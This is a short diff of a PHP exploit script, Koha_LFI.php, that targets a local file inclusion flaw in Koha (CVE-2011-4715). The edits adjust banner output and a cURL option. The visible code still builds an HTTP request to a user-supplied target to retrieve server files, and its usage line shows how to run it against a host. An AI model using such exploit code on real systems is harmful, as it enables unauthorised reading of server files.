@@ -51,7 +51,8 @@ $headers=array(
  	echo "Site: http://munir.skilledsoft.com \n\n";
  	echo "CVE: 2011-4715, OSVDB-ID:77322, EDB-ID: 18153 \n\n";
  	echo "Usage: php Koha_LFI.php target_host \n\n";
- 	echo "Example: php Koha_LFI.php target.com ";
+ 	echo "Example: php Koha_LFI.php target.com \n\n ";
+ 	echo "##########################################\n\n";
  }
  
 if ($target==""){
@@ -65,11 +66,11 @@ else{
 		    CURLOPT_BINARYTRANSFER=> true,
 		    CURLOPT_URL => 'http://'.$target.$vuln_script,
 		    CURLOPT_HTTPHEADER => $headers,
-		    CURLOPT_HEADER => true
+		    CURLOPT_HEADER => False
 	    )
 	);
 	$result = curl_exec($perform_LFI);
-	echo "Attempting to retrieve Information From Server Please Be Patient: \n\n";
+	echo banner()."Attempting to retrieve Information From Server Please Be Patient: \n\n";
 	if(!curl_exec($perform_LFI)){
 	    die('Error: "' . curl_error($perform_LFI) . '" - Code: ' . curl_errno($perform_LFI));
 	}
